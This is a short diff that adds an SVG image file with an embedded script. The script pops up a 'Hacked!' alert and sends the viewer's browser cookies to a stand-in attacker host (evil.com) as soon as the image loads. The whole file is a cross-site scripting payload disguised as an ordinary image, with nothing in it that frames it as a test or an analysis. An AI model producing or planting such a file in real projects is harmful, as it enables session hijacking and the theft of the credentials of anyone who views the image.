@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    alert('Hacked!'); // Executes when the image is loaded
+    document.location='http://evil.com/steal?cookie=' + document.cookie;
+  </script>
+</svg>
